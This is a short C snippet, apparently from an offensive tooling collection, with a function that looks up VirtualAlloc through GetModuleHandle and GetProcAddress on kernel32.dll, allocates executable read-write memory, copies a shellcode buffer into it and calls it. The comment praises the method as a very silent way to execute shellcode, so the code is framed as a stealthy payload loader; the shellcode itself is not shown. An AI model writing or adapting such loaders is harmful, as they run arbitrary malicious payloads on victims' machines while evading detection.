// This method does not even uses the LoadLibrary function it takes advantage of already loaded kernel32.dll, GetModuleHandle function retrieves the module handle from an already loaded dll, this method is possibly one of the most silent way to execute shellcode.
void ExecuteShellcode(){
  MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
  char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(BUFFER, Shellcode, sizeof(Shellcode));
  (*(void(*)())BUFFER)();  
}